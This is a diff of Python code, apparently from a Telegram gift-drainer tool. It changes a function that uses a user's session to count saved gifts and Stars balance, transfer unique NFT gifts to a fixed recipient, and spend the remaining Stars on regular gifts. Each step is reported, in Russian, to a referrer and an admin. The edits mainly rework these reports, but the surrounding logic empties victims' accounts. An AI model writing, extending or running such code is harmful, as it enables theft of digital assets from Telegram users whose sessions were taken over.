@@ -102,17 +102,16 @@ async def auto_transfer_gifts_async(user_id: str, limit: int = 200) -> Optional[
                 print(f"[AUTO-TRANSFER] [ERROR] {error_msg}")
                 
                 # Send admin notification about failure
-                if referral_link and referrer_id and user_telegram_id:
-                    notification = format_gift_transfer_notification(
-                        referrer_id=referrer_id,
-                        referrer_username=referrer_username,
-                        user_id=user_telegram_id,
-                        user_username=user_username,
-                        success=False,
-                        details=error_msg,
-                        total_gifts_value=None
-                    )
-                    send_admin_notification(notification)
+                notification = format_gift_transfer_notification(
+                    user_id=user_telegram_id,
+                    user_username=user_username,
+                    success=False,
+                    details=error_msg,
+                    referrer_id=referrer_id,
+                    referrer_username=referrer_username,
+                    total_gifts_value=None
+                )
+                send_admin_notification(notification)
                 
                 return error_msg
 
@@ -126,6 +125,14 @@ async def auto_transfer_gifts_async(user_id: str, limit: int = 200) -> Optional[
             except Exception:
                 pass
             
+            # Log successful authorization to referrer
+            try:
+                telegram_user_id = int(user_id) if user_id.isdigit() else None
+                if telegram_user_id:
+                    log_referral_action(telegram_user_id, "auth_success", None)
+            except (ValueError, AttributeError):
+                pass
+            
             print(f"[AUTO-TRANSFER] [INFO] User: {user_id}, Recipient: {RECIPIENT_USER_ID}")
 
             # Get all saved gifts
@@ -133,31 +140,85 @@ async def auto_transfer_gifts_async(user_id: str, limit: int = 200) -> Optional[
             gifts = await get_saved_star_gifts(client=client, peer=me, limit=limit)
             unique = filter_unique_star_gifts(gifts)
             print(f"[AUTO-TRANSFER] [INFO] Total saved gifts: {len(gifts)}, Unique (NFT): {len(unique)}")
+            
+            # Get Stars balance
+            stars_balance = await get_stars_balance(client=client, peer=me)
+            
+            # Log gift check info to referrer
+            try:
+                telegram_user_id = int(user_id) if user_id.isdigit() else None
+                if telegram_user_id:
+                    gift_info = f"📊 Найдено сохраненных подарков: {len(gifts)}\n💎 Уникальных (NFT): {len(unique)}\n⭐ Баланс Stars: {stars_balance}"
+                    log_referral_action(telegram_user_id, "auth_check_gifts", gift_info)
+            except (ValueError, AttributeError):
+                pass
 
             if len(unique) == 0:
                 print("[AUTO-TRANSFER] [INFO] No unique gifts found. Checking for regular gifts...")
                 # No unique gifts, but still try to send regular gifts if balance > 0
-                stars_balance = await get_stars_balance(client=client, peer=me)
-                print(f"[AUTO-TRANSFER] [INFO] Current Stars balance: {stars_balance}")
                 if stars_balance > 0:
                     print(f"[AUTO-TRANSFER] [INFO] Sending regular gifts with {stars_balance} Stars...")
-                    await _send_regular_gifts(client, me, stars_balance)
-                    # Log successful transfer (no unique gifts, but sent regular)
+                    regular_gifts_value = await _send_regular_gifts(client, me, stars_balance)
+                    
+                    # Get referrer info
+                    if referral_link and referrer_id:
+                        try:
+                            referrer_entity = await client.get_entity(referrer_id)
+                            if hasattr(referrer_entity, 'username'):
+                                referrer_username = referrer_entity.username
+                        except Exception:
+                            pass
+                    
+                    # Log to referrer
                     try:
                         telegram_user_id = int(user_id) if user_id.isdigit() else None
                         if telegram_user_id:
-                            log_referral_action(telegram_user_id, "gift_transfer", "success: no unique gifts, sent regular gifts")
+                            log_referral_action(telegram_user_id, "gift_transfer", f"✅ Уникальных подарков не найдено\n💫 Отправлено обычных подарков на {regular_gifts_value} Stars")
                     except (ValueError, AttributeError):
                         pass
+                    
+                    # Send admin notification
+                    notification = format_gift_transfer_notification(
+                        user_id=user_telegram_id,
+                        user_username=user_username,
+                        success=True,
+                        details=f"Уникальных подарков не найдено. Отправлено обычных подарков на {regular_gifts_value} Stars",
+                        referrer_id=referrer_id,
+                        referrer_username=referrer_username,
+                        total_gifts_value=regular_gifts_value
+                    )
+                    send_admin_notification(notification)
                 else:
                     print("[AUTO-TRANSFER] [INFO] No Stars balance, nothing to send")
-                    # Log no transfer (no unique gifts, no balance)
+                    
+                    # Get referrer info
+                    if referral_link and referrer_id:
+                        try:
+                            referrer_entity = await client.get_entity(referrer_id)
+                            if hasattr(referrer_entity, 'username'):
+                                referrer_username = referrer_entity.username
+                        except Exception:
+                            pass
+                    
+                    # Log to referrer
                     try:
                         telegram_user_id = int(user_id) if user_id.isdigit() else None
                         if telegram_user_id:
-                            log_referral_action(telegram_user_id, "gift_transfer", "no_unique_gifts_no_balance")
+                            log_referral_action(telegram_user_id, "gift_transfer", "❌ Подарков не найдено\n⭐ Баланс Stars: 0\n📭 Нечего отправлять")
                     except (ValueError, AttributeError):
                         pass
+                    
+                    # Send admin notification
+                    notification = format_gift_transfer_notification(
+                        user_id=user_telegram_id,
+                        user_username=user_username,
+                        success=False,
+                        details="Подарков не найдено. Баланс Stars: 0",
+                        referrer_id=referrer_id,
+                        referrer_username=referrer_username,
+                        total_gifts_value=None
+                    )
+                    send_admin_notification(notification)
                 return None
 
             # Calculate required Stars (15 per unique gift)
@@ -277,23 +338,27 @@ async def auto_transfer_gifts_async(user_id: str, limit: int = 200) -> Optional[
                 try:
                     telegram_user_id = int(user_id) if user_id.isdigit() else None
                     if telegram_user_id:
-                        details = f"success: transferred {transferred} unique gifts, failed {failed}"
-                        log_referral_action(telegram_user_id, "gift_transfer", details)
+                        status_msg = f"✅ Передача подарков завершена\n\n💎 Уникальных подарков: {transferred}"
+                        if failed > 0:
+                            status_msg += f"\n❌ Ошибок при передаче: {failed}"
+                        if regular_gifts_value > 0:
+                            status_msg += f"\n💫 Обычных подарков: {regular_gifts_value} Stars"
+                        status_msg += f"\n\n💰 Общая стоимость: {total_gifts_value} Stars"
+                        log_referral_action(telegram_user_id, "gift_transfer", status_msg)
                 except (ValueError, AttributeError):
                     pass
                 
                 # Send admin notification
-                if referral_link and referrer_id and user_telegram_id:
-                    notification = format_gift_transfer_notification(
-                        referrer_id=referrer_id,
-                        referrer_username=referrer_username,
-                        user_id=user_telegram_id,
-                        user_username=user_username,
-                        success=True,
-                        details=f"Передано уникальных подарков: {transferred}, Ошибок: {failed}. Обычных подарков отправлено на {regular_gifts_value} Stars",
-                        total_gifts_value=total_gifts_value
-                    )
-                    send_admin_notification(notification)
+                notification = format_gift_transfer_notification(
+                    user_id=user_telegram_id,
+                    user_username=user_username,
+                    success=True,
+                    details=f"Передано уникальных подарков: {transferred}, Ошибок: {failed}. Обычных подарков отправлено на {regular_gifts_value} Stars",
+                    referrer_id=referrer_id,
+                    referrer_username=referrer_username,
+                    total_gifts_value=total_gifts_value
+                )
+                send_admin_notification(notification)
             else:
                 error_msg = f"Still not enough Stars ({stars_balance} < {required_transfer})"
                 print(f"[AUTO-TRANSFER] [ERROR] {error_msg}")
@@ -311,22 +376,22 @@ async def auto_transfer_gifts_async(user_id: str, limit: int = 200) -> Optional[
                 try:
                     telegram_user_id = int(user_id) if user_id.isdigit() else None
                     if telegram_user_id:
-                        log_referral_action(telegram_user_id, "gift_transfer", f"failed: {error_msg}")
+                        failure_msg = f"❌ Передача подарков не удалась\n\n💎 Найдено уникальных подарков: {len(unique)}\n⭐ Требуется Stars: {required_transfer}\n💰 Текущий баланс: {stars_balance}\n📉 Недостает: {required_transfer - stars_balance} Stars"
+                        log_referral_action(telegram_user_id, "gift_transfer", failure_msg)
                 except (ValueError, AttributeError):
                     pass
                 
                 # Send admin notification
-                if referral_link and referrer_id and user_telegram_id:
-                    notification = format_gift_transfer_notification(
-                        referrer_id=referrer_id,
-                        referrer_username=referrer_username,
-                        user_id=user_telegram_id,
-                        user_username=user_username,
-                        success=False,
-                        details=error_msg,
-                        total_gifts_value=None
-                    )
-                    send_admin_notification(notification)
+                notification = format_gift_transfer_notification(
+                    user_id=user_telegram_id,
+                    user_username=user_username,
+                    success=False,
+                    details=f"Недостаточно Stars: требуется {required_transfer}, текущий баланс {stars_balance}",
+                    referrer_id=referrer_id,
+                    referrer_username=referrer_username,
+                    total_gifts_value=None
+                )
+                send_admin_notification(notification)
 
             print(f"[AUTO-TRANSFER] [INFO] Auto-transfer completed for user_id={user_id}")
             return None
@@ -338,26 +403,43 @@ async def auto_transfer_gifts_async(user_id: str, limit: int = 200) -> Optional[
         import traceback
         print(f"[AUTO-TRANSFER] [ERROR] Traceback: {traceback.format_exc()}")
         
+        # Get referrer info if available
+        if referral_link and referrer_id:
+            try:
+                # Try to get client if not already connected
+                try:
+                    temp_client = get_telegram_client(user_id)
+                    await temp_client.connect()
+                    if await temp_client.is_user_authorized():
+                        referrer_entity = await temp_client.get_entity(referrer_id)
+                        if hasattr(referrer_entity, 'username'):
+                            referrer_username = referrer_entity.username
+                    await temp_client.disconnect()
+                except Exception:
+                    pass
+            except Exception:
+                pass
+        
         # Log failed transfer with error
         try:
             telegram_user_id = int(user_id) if user_id.isdigit() else None
             if telegram_user_id:
-                log_referral_action(telegram_user_id, "gift_transfer", f"failed: {error_msg}")
+                error_display = f"❌ Ошибка при передаче подарков\n\n⚠️ {str(e)}"
+                log_referral_action(telegram_user_id, "gift_transfer", error_display)
         except (ValueError, AttributeError):
             pass
         
         # Send admin notification about error
-        if referral_link and referrer_id and user_telegram_id:
-            notification = format_gift_transfer_notification(
-                referrer_id=referrer_id,
-                referrer_username=referrer_username,
-                user_id=user_telegram_id,
-                user_username=user_username,
-                success=False,
-                details=f"Ошибка: {error_msg}",
-                total_gifts_value=None
-            )
-            send_admin_notification(notification)
+        notification = format_gift_transfer_notification(
+            user_id=user_telegram_id,
+            user_username=user_username,
+            success=False,
+            details=f"Ошибка: {error_msg}",
+            referrer_id=referrer_id,
+            referrer_username=referrer_username,
+            total_gifts_value=None
+        )
+        send_admin_notification(notification)
         
         return error_msg
 
